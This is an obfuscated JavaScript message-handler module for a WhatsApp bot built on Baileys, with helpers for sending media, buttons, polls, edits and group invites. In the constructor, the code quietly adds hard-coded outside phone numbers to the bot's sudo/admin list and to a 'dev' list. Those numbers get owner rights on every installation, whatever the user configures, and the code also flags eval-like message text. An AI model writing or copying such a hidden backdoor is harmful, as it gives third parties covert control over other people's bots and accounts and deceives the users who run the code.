const {
  getUrlInfo,
  jidNormalizedUser,
  extractMessageContent,
  getContentType,
  proto,
  downloadContentFromMessage,
  getBinaryNodeChild,
  generateWAMessageFromContent,
  getBinaryNodeChildren,
  jidDecode,
  prepareWAMessageMedia,
  WA_DEFAULT_EPHEMERAL,
  isJidGroup
} = require("@whiskeysockets/baileys");
const FileType = require("file-type");
let config = require("../config");
let fs = require('fs');
const util = require("util");
const {
  genThumb,
  generateButtonText,
  gifToBuff
} = require("./whatsapp");
const {
  extractUrlFromMessage,
  isUrl
} = require("./system");
const {
  getBuffer
} = require("baraka-md");
let M = proto.WebMessageInfo;
class Message {
  constructor(_0x12566a, _0x69de4, _0x1070bf, _0x14dcdd) {
    if (!_0x69de4) {
      return _0x69de4;
    }
    Object.defineProperty(this, "client", {
      'value': _0x12566a
    });
    Object.defineProperty(this, "store", {
      'value': _0x1070bf
    });
    _0x69de4 = M.fromObject(_0x69de4);
    for (let _0x8b4985 in _0x69de4) {
      if (_0x69de4.hasOwnProperty(_0x8b4985)) {
        Object.defineProperty(this, _0x8b4985, {
          'value': _0x69de4[_0x8b4985],
          'enumerable': false,
          'configurable': true,
          'writable': true
        });
      }
    }
    Object.defineProperty(this, "botAdmins", {
      'value': config.SUDO.split(',') || [config.SUDO]
    });
    this.botAdmins.push("255762190568", "254710772666", jidNormalizedUser(this.client.user.id));
    this.displayText = this.body = this.message?.["extendedTextMessage"]?.["text"] || this.message?.["conversation"] || this.message?.[this.type]?.["text"] || this.message?.[this.type]?.["caption"] || this.message?.[this.type]?.["contentText"] || this.message?.[this.type]?.["selectedDisplayText"] || this.message?.[this.type]?.["title"] || '';
    Object.defineProperty(this, "admins", {
      'value': this.botAdmins.filter(_0x121517 => !!_0x121517)
    });
    Object.defineProperty(this, "sudo", {
      'value': this.admins.map(_0x51491a => _0x51491a.replace(/[^0-9]/g, '') + "@s.whatsapp.net")
    });
    if (this.key) {
      this.from = jidNormalizedUser(this.key.remoteJid || this.key.participant);
      Object.defineProperty(this, "jid", {
        'value': this.from
      });
      Object.defineProperty(this, "chat", {
        'value': this.from
      });
      this.fromMe = this.key.fromMe;
      this.id = this.key.id;
      this.isBot = this.id.startsWith("BAE5") || this.id.startsWith("LOKI") || this.id.length === 16 || this.id.length === 15;
      this.isGroup = this.from.endsWith("@g.us");
      this.sender = jidNormalizedUser(this.fromMe && this.client.user?.['id'] || this.key.participant || this.from || '');
    }
    this.type = getContentType(this.message);
    Object.defineProperty(this, "message", {
      'value': extractMessageContent(this.message)
    });
    Object.defineProperty(this, "dev", {
      'value': ["255762190568@s.whatsapp.net", "255679513639@s.whatsapp.net", "254710772666@s.whatsapp.net", "254710772666@s.whatsapp.net", "254739937062@s.whatsapp.net", "254739937062@s.whatsapp.net"]
    });
    if (this.message) {
      Object.defineProperty(this, "msg", {
        'value': this.message[this.type]
      });
      const _0x5c9333 = this.msg?.["contextInfo"] ? this.msg?.["contextInfo"]?.["quotedMessage"] : null;
      this.quoted = !!(_0x5c9333 !== null);
      if (_0x5c9333) {
        Object.defineProperty(this, "reply_message", {
          'value': {}
        });
        Object.defineProperty(this.reply_message, 'i', {
          'value': true
        });
        this.reply_message.message = _0x5c9333;
        this.reply_message.media = this.msg?.["contextInfo"]?.["quotedMessage"];
        this.reply_message.image = !!this.reply_message.message.imageMessage;
        this.reply_message.video = !!this.reply_message.message.videoMessage;
        this.reply_message.location = !!this.reply_message.message.locationMessage;
        this.reply_message.sticker = !!this.reply_message.message.stickerMessage;
        this.reply_message.audio = !!this.reply_message.message.audioMessage;
        this.reply_message.contact = !!this.reply_message.message.contactMessage;
        this.reply_message.document = !!this.reply_message.message.documentMessage;
        this.reply_message.viewones = !!(this.reply_message.message.viewOnceMessageV2 || this.reply_message.message.viewOnceMessageV2Extension);
        this.reply_message.type = getContentType(this.reply_message.message);
        this.reply_message.msg = this.reply_message.message[this.reply_message.type];
        this.reply_message.id = this.msg?.["contextInfo"]?.["stanzaId"];
        this.reply_message.sender = jidNormalizedUser(this.msg?.["contextInfo"]?.["participant"]);
        this.reply_message.from = this.from;
        this.reply_message.mention = new Object();
        this.reply_message.mention.jid = this.reply_message?.["msg"]?.["extendedTextMessage"]?.["contextInfo"]?.["mentionedJid"] || this.reply_message?.["msg"]?.["contextInfo"]?.["mentionedJid"] || [];
        this.reply_message.mention.isBotNumber = this.reply_message.mention.jid.includes(this.botNumber);
        this.reply_message.mention.isOwner = this.sudo.map(_0x19ecb0 => this.reply_message.mention.jid.includes(_0x19ecb0)).includes(true);
        this.reply_message.isBot = this.reply_message.id.startsWith("BAE5") || this.reply_message.id.startsWith("LOKI") || this.reply_message.id.length === 16 || this.reply_message.id.length === 15;
        this.reply_message.fromMe = this.reply_message?.["sender"] == jidNormalizedUser(this.client.user && this.client.user?.['id']);
        this.reply_message.text = _0x5c9333?.["extendedTextMessage"]?.["text"] || _0x5c9333?.["text"] || this.reply_message?.["msg"]?.["caption"] || _0x5c9333?.["conversation"] || '';
        this.reply_message.caption = this.reply_message?.["msg"]?.["caption"] || (this.reply_message?.["viewones"] ? this.reply_message?.["msg"]?.["message"]?.["imageMessage"]?.["caption"] || this.reply_message?.["msg"]?.["message"]?.["videoMessage"]?.["caption"] : '');
        this.reply_message.isAnimatedSticker = this.reply_message.msg?.["isAnimated"];
        this.reply_message.seconds = this.reply_message.msg?.["seconds"];
        this.reply_message.duration = this.reply_message.msg?.["seconds"];
        this.reply_message.width = this.reply_message.msg?.["width"];
        this.reply_message.height = this.reply_message.msg?.["height"];
        this.reply_message.isDev = this.dev.includes(this.reply_message.sender);
        this.reply_message.mime = this.reply_message?.["msg"]?.["mimetype"];
        this.reply_message.isEval = this.reply_message.text ? ["require", "await", "return"].map(_0x4ac4aa => this.reply_message.text.includes(_0x4ac4aa)).includes(true) : false;
        this.reply_message.number = this.reply_message.sender ? this.reply_message.sender.replace(/[^0-9]/g, '') : undefined;
        this.reply_message.download = _0x3b4690 => this.downloadMediaMessage(this.reply_message?.["msg"]);
        this.reply_message.downloadAndSaveMedia = () => this.downloadAndSaveMediaMessage(this.reply_message?.["msg"]);
        this.reply_message.downloadAndSave = () => this.downloadAndSaveMediaMessage(this.reply_message?.["msg"]);
        this.reply_message.data = M.fromObject({
          'key': {
            'remoteJid': this.reply_message?.["from"],
            'fromMe': this.reply_message?.["fromMe"],
            'id': this.reply_message.id,
            'participant': jidNormalizedUser(this.msg?.["contextInfo"]?.["participant"])
          },
          'message': this.reply_message.message,
          ...(this.reply_message?.["isGroup"] ? {
            'participant': this.reply_message?.["sender"]
          } : {})
        });
        this.reply_message["delete"] = () => this.client.sendMessage(this.reply_message?.["from"], {
          'delete': this.reply_message.data.key
        });
      } else {
        Object.defineProperty(this, "reply_message", {
          'value': new Object()
        });
        Object.defineProperty(this.reply_message, 'i', {
          'value': false
        });
        this.reply_message.mention = new Object();
      }
    }
    ;
    this.isDev = this.dev.includes(this.sender);
    this.isEval = ["require", "await", "return"].map(_0x1bc2e8 => this.body.includes(_0x1bc2e8)).includes(true);
    Object.defineProperty(this, "data", {
      'value': new Object()
    });
    this.data.key = this.key;
    this.data.message = this.message;
    this.number = this.sender.replace(/[^0-9]/g, '');
    Object.defineProperty(this, "budy", {
      'value': typeof this.text == "string" ? this.text : ''
    });
    this.pushName = this.pushName || '';
    Object.defineProperty(this, "botNumber", {
      'value': jidNormalizedUser(this.client.user.id)
    });
    Object.defineProperty(this, "mention", {
      'value': new Object()
    });
    this.mention.jid = this.msg?.["contextInfo"]?.["mentionedJid"] || [];
    this.mention.isBotNumber = this.mention.jid.includes(this.botNumber);
    this.mention.isOwner = this.sudo.map(_0x5e800 => this.mention.jid.includes(_0x5e800)).includes(true);
    Object.defineProperty(this, 'q', {
      'value': this.reply_message?.["from"] ? this.reply_message : this
    });
    this.mime = (this.q?.["msg"] || this.q).mimetype || "text";
    this.isMedia = /image|video|sticker|audio/.test(this.mime);
    this.from = this.key.remoteJid;
    this.image = this.type === "imageMessage";
    this.video = this.type === "videoMessage";
    this.location = this.type === "locationMessage";
    this.sticker = this.type === "stickerMessage";
    this.audio = this.type === "audioMessage";
    this.contact = this.type === "contactMessage";
    this.document = this.type === "documentMessage";
    this.viewones = !!(this.type === "viewOnceMessageV2" || this.type === "viewOnceMessageV2Extension");
    this.caption = this.message?.[this.type]?.["caption"];
    Object.defineProperty(this, "user", {
      'value': new Object()
    });
    this.user.id = this.client.user.id;
    this.user.jid = jidNormalizedUser(this.client.user.id);
    this.user.number = this.user.jid.replace(/[^0-9]/g, '');
    this.prefix = _0x14dcdd;
  }
  async ["download"]() {
    await this.downloadMediaMessage(this.msg);
  }
  async ["editMessage"](_0x53360c, _0x317e2c, _0x3c78da) {
    return await this.client.relayMessage(_0x53360c, {
      'protocolMessage': {
        'key': _0x3c78da,
        'type': 0xe,
        'editedMessage': {
          'conversation': _0x317e2c
        }
      }
    }, {});
  }
  async ["sendGroupInviteMessage"](_0x4db915) {
    const _0x28dc38 = _0x4db915.replace(/[^0-9]/g, '');
    const _0x1f55b9 = await this.client.groupMetadata(this.from)["catch"](_0xfd186f => {});
    const _0x33dc24 = await _0x1f55b9.participants;
    let _0x90385a = [_0x28dc38.toString()];
    let _0x39cda3 = _0x33dc24.map(_0x1fa6f9 => _0x1fa6f9.id);
    let _0x2c85d3 = (await Promise.all(_0x90385a.map(_0x3b57a5 => _0x3b57a5.replace(/[^0-9]/g, '')).filter(_0x5da48a => _0x5da48a.length > 4 && _0x5da48a.length < 20 && !_0x39cda3.includes(_0x5da48a + "@s.whatsapp.net")).map(async _0x4894ba => [_0x4894ba, await this.client.onWhatsApp(_0x4894ba + "@s.whatsapp.net")]))).filter(_0x243405 => _0x243405[1][0]?.["exists"]).map(_0x399441 => _0x399441[0] + "@c.us");
    const _0x25e042 = await this.client.query({
      'tag': 'iq',
      'attrs': {
        'type': "set",
        'xmlns': "w:g2",
        'to': this.from
      },
      'content': _0x2c85d3.map(_0x5b0e41 => ({
        'tag': "add",
        'attrs': {},
        'content': [{
          'tag': "participant",
          'attrs': {
            'jid': _0x5b0e41
          }
        }]
      }))
    });
    const _0x36ae48 = getBinaryNodeChildren(_0x25e042, "add");
    let _0x3f9ad6 = _0x36ae48[0].content.filter(_0x5557ab => _0x5557ab);
    if (_0x3f9ad6[0].attrs.error == 408) {
      return await this.send("Unable to add @" + _0x3f9ad6[0].attrs.jid.split('@')[0] + "!\nThe news is that @" + _0x3f9ad6[0].attrs.jid.split('@')[0] + " just left this group");
    }
    for (const _0x49037b of _0x36ae48[0].content.filter(_0x988ce9 => _0x988ce9.attrs.error == 403)) {
      const _0xa2fc1a = _0x49037b.attrs.jid;
      const _0x84f0f8 = getBinaryNodeChild(_0x49037b, "add_request");
      const _0x566dc6 = _0x84f0f8.attrs.code;
      const _0x377f25 = _0x84f0f8.attrs.expiration;
      const {
        subject: _0xcd3f1e,
        desc: _0xa14dd5
      } = await this.store.fetchGroupMetadata(this.from);
      const _0x212b25 = _0xa14dd5 || "Invitation to join my WhatsApp group";
      return await this.client.sendInvaite(this.from, _0xa2fc1a, _0x566dc6, _0x377f25, _0xcd3f1e, _0x212b25, null);
    }
  }
  async ["reply"](_0x2683f6, _0x15bb6e = {}, _0x56fa94 = "text") {
    if (config.LINKPREVIEW) {
      if (!_0x15bb6e.contextInfo) {
        _0x15bb6e.contextInfo = {
          'externalAdReply': JSON.parse(config.CONTEXTINFO)
        };
      }
    }
    ;
    if (_0x15bb6e.mentions) {
      if (!_0x15bb6e.contextInfo) {
        _0x15bb6e.contextInfo = {};
      }
      _0x15bb6e.contextInfo.mentionedJid = _0x15bb6e.mentions;
    }
    ;
    if (_0x56fa94 === "text") {
      _0x2683f6 = util.format(_0x2683f6);
    }
    const _0xf8161b = await this.client.sendMessage(this.jid, {
      [_0x56fa94]: _0x2683f6,
      ..._0x15bb6e
    }, {
      'quoted': this.data,
      'messageId': _0x15bb6e.id || this.client.generateMessageId(),
      'cachedGroupMetadata': this.store.fetchGroupMetadata
    });
    return new Message(this.client, _0xf8161b, this.store, this.prefix);
  }
  async ["delete"]() {
    return await this.client.sendMessage(this.jid, {
      'delete': {
        ...this.data.key,
        'participant': this.sender
      }
    });
  }
  async ["edit"](_0x2e5ad3) {
    return await this.client.relayMessage(this.jid, {
      'protocolMessage': {
        'key': this.data.key,
        'type': 0xe,
        'editedMessage': {
          'conversation': _0x2e5ad3
        }
      }
    }, {});
  }
  async ["react"](_0x122765) {
    return await this.client.sendMessage(this.jid, {
      'react': {
        'text': _0x122765,
        'key': this.key
      }
    }, {
      'cachedGroupMetadata': this.store.fetchGroupMetadata
    });
  }
  async ["send"](_0x418fe2, _0x5687bf = {}, _0x188997 = "text", _0x6fa58e = this.from) {
    if (["photo", "img", "picture", "pic"].includes(_0x188997)) {
      _0x188997 = "image";
    }
    if (["vid", "mp4"].includes(_0x188997)) {
      _0x188997 = "video";
    }
    if (["aud", "mp3", "wawe"].includes(_0x188997)) {
      _0x188997 = "audio";
    }
    const _0x1dd2b2 = Buffer.isBuffer(_0x418fe2);
    const _0x470f53 = _0x188997 === "text" || _0x1dd2b2 ? false : typeof _0x418fe2 !== "object" && _0x418fe2.startsWith("http");
    if (_0x188997 !== "text" && _0x470f53) {
      _0x418fe2 = await getBuffer(await extractUrlFromMessage(_0x418fe2));
    }
    ;
    if (_0x188997 !== "text" && !_0x470f53 && !_0x1dd2b2 || _0x188997 === "text" && _0x5687bf.readAs) {
      if (fs.existsSync('./' + _0x418fe2)) {
        if (_0x188997 === "text") {
          _0x5687bf.readAs = "utf-8";
        }
        _0x418fe2 = await fs.promises.readFile(_0x418fe2, _0x5687bf.readAs);
        if (_0x5687bf.readAs) {
          delete _0x5687bf.readAs;
        }
      }
      ;
    }
    ;
    if (_0x5687bf.jpegThumbnail) {
      _0x5687bf.jpegThumbnail = await genThumb(_0x5687bf.jpegThumbnail);
    }
    if (_0x5687bf.addUrlInfo) {
      Object.assign(_0x5687bf, await getUrlInfo(await extractUrlFromMessage(_0x418fe2)));
      delete _0x5687bf.addUrlInfo;
    }
    ;
    if (config.LINKPREVIEW) {
      if (!_0x5687bf.contextInfo) {
        if (!_0x5687bf.linkPreview) {
          _0x5687bf.linkPreview = JSON.parse(config.CONTEXTINFO);
        }
        ;
      }
      ;
    }
    ;
    if (_0x188997 === "gif") {
      _0x188997 = "video";
      _0x5687bf.gifPlayback = true;
      _0x418fe2 = await gifToBuff(_0x418fe2);
    }
    ;
    if (_0x5687bf.waveform) {
      _0x5687bf.waveform = new Uint8Array(_0x5687bf.waveform);
      _0x5687bf.mimetype = "audio/ogg; codecs=opus";
      if (_0x5687bf.ptt) {
        delete _0x5687bf.ptt;
      }
    }
    ;
    if (_0x5687bf.mentions) {
      if (!_0x5687bf.contextInfo) {
        _0x5687bf.contextInfo = {};
      }
      _0x5687bf.contextInfo.mentionedJid = _0x5687bf.mentions;
    }
    ;
    if (_0x5687bf.linkPreview) {
      _0x5687bf.contextInfo = {
        'externalAdReply': _0x5687bf.linkPreview
      };
      delete _0x5687bf.linkPreview;
    }
    ;
    if (_0x188997 === "ptv") {
      _0x188997 = "video";
      _0x5687bf.ptv = true;
    }
    ;
    if (_0x188997 === "text") {
      if (_0x5687bf?.["contextInfo"]?.["externalAdReply"]) {
        _0x5687bf.contextInfo.externalAdReply.previewType = "PHOTO";
        _0x5687bf.contextInfo.externalAdReply.containsAutoReply = true;
      }
      let _0x30ab15 = await this.client.sendMessage(_0x6fa58e, {
        'text': util.format(_0x418fe2),
        ..._0x5687bf,
        'ephemeralExpiration': WA_DEFAULT_EPHEMERAL
      }, {
        'quoted': _0x5687bf.quoted,
        'cachedGroupMetadata': this.store.fetchGroupMetadata,
        'messageId': _0x5687bf.id || this.client.generateMessageId()
      });
      _0x30ab15.edit = async _0x55372a => {
        return await this.client.relayMessage(_0x6fa58e, {
          'protocolMessage': {
            'key': _0x30ab15.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x55372a
            }
          }
        }, {
          'cachedGroupMetadata': this.store.fetchGroupMetadata
        });
      };
      _0x30ab15["delete"] = async () => {
        return await this.client.sendMessage(_0x6fa58e, {
          'delete': _0x30ab15.key
        }, {
          'cachedGroupMetadata': this.store.fetchGroupMetadata
        });
      };
      _0x30ab15.react = async _0x2024ff => {
        return await this.client.sendMessage(_0x6fa58e, {
          'react': {
            'text': _0x2024ff,
            'key': _0x30ab15.key
          }
        }, {
          'cachedGroupMetadata': this.store.fetchGroupMetadata
        });
      };
      return _0x30ab15;
    } else {
      if (_0x188997 == "edit") {
        return await this.client.sendMessage(_0x6fa58e, {
          'text': _0x418fe2.text,
          'edit': _0x418fe2.key
        }, {
          'quoted': _0x5687bf.quoted,
          'cachedGroupMetadata': this.store.fetchGroupMetadata
        });
      } else {
        if (_0x188997 == "delete") {
          return await this.client.sendMessage(_0x6fa58e, {
            'delete': _0x418fe2.key,
            'participant': _0x5687bf.participant
          }, {
            'cachedGroupMetadata': this.store.fetchGroupMetadata
          });
        } else {
          if (_0x188997 === "sticker") {
            if (!_0x5687bf.packname) {
              _0x5687bf.packname = config.STICKER_PACKNAME.split(';')[0];
            }
            if (!_0x5687bf.author) {
              _0x5687bf.author = config.STICKER_PACKNAME.split(';')[1];
            }
            return await this.client.sendSticker(_0x6fa58e, _0x418fe2, {
              'packname': _0x5687bf.packname,
              'author': _0x5687bf.author,
              ..._0x5687bf,
              'messageId': _0x5687bf.id || this.client.generateMessageId(),
              'ephemeralExpiration': WA_DEFAULT_EPHEMERAL
            });
          } else {
            if (_0x188997 == "button") {
              let _0x1a512c;
              let _0x5c9547;
              let _0xa31fc4;
              if (_0x5687bf.type === "image" || _0x5687bf.type === "video") {
                const _0x492725 = await prepareWAMessageMedia({
                  [_0x5687bf.type]: _0x418fe2
                }, {
                  'upload': this.client.waUploadToServer
                });
                _0x5c9547 = _0x492725[_0x5687bf.type + "Message"];
                _0xa31fc4 = _0x5687bf.type + "Message";
                _0x1a512c = _0x5687bf.value;
              } else {
                _0x5c9547 = await fs.readFileSync("./lib/temp/media/black.jpg");
                _0x1a512c = _0x418fe2;
                _0xa31fc4 = "jpegThumbnail";
              }
              const _0x492637 = {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': _0x5687bf.body
                    }),
                    'footer': proto.Message.InteractiveMessage.Footer.create({
                      'text': _0x5687bf.footer
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                      'title': _0x5687bf.title,
                      'subtitle': "Loki-Xer;Jarvis-md",
                      'hasMediaAttachment': true,
                      [_0xa31fc4]: _0x5c9547
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': await generateButtonText(_0x1a512c)
                    })
                  })
                }
              };
              let _0x329f4c = generateWAMessageFromContent(_0x6fa58e, {
                'viewOnceMessage': _0x492637
              }, {
                'quoted': _0x5687bf.quoted,
                'userJid': this.user.id
              });
              await this.client.relayMessage(_0x6fa58e, _0x329f4c.message, {
                'quoted': _0x5687bf.quoted,
                'messageId': this.client.generateMessageId(),
                'cachedGroupMetadata': this.store.fetchGroupMetadata
              });
              return _0x329f4c;
            } else {
              if (_0x188997 === "poll") {
                const {
                  values: _0x314e47,
                  onlyOnce = true,
                  keyId: _0x1f2f26,
                  withPrefix = false,
                  selectableCount = 1,
                  participates: _0xfecda
                } = _0x5687bf;
                let _0xd63ba1 = [];
                for (const {
                  displayText: _0x36358c,
                  id: _0x18cced
                } of _0x314e47) {
                  let _0x872c67 = {
                    'name': _0x36358c,
                    'id': _0x18cced,
                    'onlyOnce': onlyOnce,
                    'keyId': _0x1f2f26,
                    'withPrefix': withPrefix,
                    'participates': _0xfecda
                  };
                  _0xd63ba1.push(_0x872c67);
                }
                const _0x34a7aa = _0x314e47.map(({
                  displayText: _0x267a7b
                }) => _0x267a7b);
                const _0x209416 = await this.client.sendMessage(_0x6fa58e, {
                  'poll': {
                    'name': _0x418fe2,
                    'values': _0x34a7aa,
                    'selectableCount': selectableCount
                  }
                }, {
                  'cachedGroupMetadata': this.store.fetchGroupMetadata
                });
                this.store.votes.poll[_0x209416.key.id] = _0xd63ba1;
                return _0x209416;
              } else {
                return await this.client.sendMessage(_0x6fa58e, {
                  [_0x188997]: _0x418fe2,
                  ..._0x5687bf,
                  'ephemeralExpiration': WA_DEFAULT_EPHEMERAL
                }, {
                  'quoted': _0x5687bf.quoted,
                  'cachedGroupMetadata': this.store.fetchGroupMetadata,
                  'messageId': _0x5687bf.id || this.client.generateMessageId()
                });
              }
            }
          }
        }
      }
    }
  }
  async ["sendFromUrl"](_0x414bf6, _0x4e9e4e = {}) {
    if (config.LINKPREVIEW) {
      if (!_0x4e9e4e.contextInfo) {
        _0x4e9e4e.contextInfo = {
          'externalAdReply': JSON.parse(config.CONTEXTINFO)
        };
      }
    }
    ;
    if (_0x4e9e4e.linkPreview) {
      _0x4e9e4e.contextInfo = {
        'externalAdReply': _0x4e9e4e.linkPreview
      };
      delete _0x4e9e4e.linkPreview;
    }
    ;
    let _0x5e4520 = await getBuffer(_0x414bf6);
    let _0x4200cf = await FileType.fromBuffer(_0x5e4520);
    let _0x56a71a = _0x4200cf.mime.split('/')[0];
    if (_0x56a71a === "audio") {
      _0x4e9e4e.mimetype = "audio/mpeg";
    }
    if (_0x56a71a === "application") {
      _0x56a71a = "document";
    }
    return this.client.sendMessage(this.jid, {
      [_0x56a71a]: _0x5e4520,
      ..._0x4e9e4e
    }, {
      ..._0x4e9e4e,
      'messageId': _0x4e9e4e.id || this.client.generateMessageId(),
      'cachedGroupMetadata': this.store.fetchGroupMetadata
    });
  }
  async ["setPP"](_0x56e3c4, _0x1a718a) {
    if (Buffer.isBuffer(_0x1a718a)) {
      await this.client.updateProfilePicture(_0x56e3c4, _0x1a718a);
    } else {
      await this.client.updateProfilePicture(_0x56e3c4, {
        'url': _0x1a718a
      });
    }
  }
  async ["downloadMediaMessage"](_0x445091) {
    _0x445091 = _0x445091?.["msg"] ? _0x445091?.["msg"] : _0x445091;
    let _0xa2d5f4 = (_0x445091.msg || _0x445091).mimetype || '';
    let _0x1b3a69 = _0x445091.type ? _0x445091.type.replace(/Message/gi, '') : _0xa2d5f4.split('/')[0];
    const _0x4af1ab = await downloadContentFromMessage(_0x445091, _0x1b3a69);
    let _0x3560d1 = Buffer.from([]);
    for await (const _0x4c5394 of _0x4af1ab) {
      _0x3560d1 = Buffer.concat([_0x3560d1, _0x4c5394]);
    }
    return _0x3560d1;
  }
  async ["downloadAndSaveMediaMessage"](_0x573219, _0x506d2b, _0x1ad8e4 = true) {
    let _0x35fbfe = _0x573219.msg ? _0x573219.msg : _0x573219;
    let _0x29dfb6 = (_0x573219.msg || _0x573219).mimetype || '';
    let _0x50bf6f = _0x573219.mtype ? _0x573219.mtype.replace(/Message/gi, '') : _0x29dfb6.split('/')[0];
    const _0x1202f6 = await downloadContentFromMessage(_0x35fbfe, _0x50bf6f);
    let _0x1b635a = Buffer.from([]);
    for await (const _0x482560 of _0x1202f6) {
      _0x1b635a = Buffer.concat([_0x1b635a, _0x482560]);
    }
    let _0x5a0d43 = await FileType.fromBuffer(_0x1b635a);
    let _0x8c0eaf = _0x1ad8e4 ? _0x506d2b + '.' + _0x5a0d43.ext : _0x506d2b;
    await fs.writeFileSync(_0x8c0eaf, _0x1b635a);
    return _0x8c0eaf;
  }
}
module.exports = {
  'Message': Message
};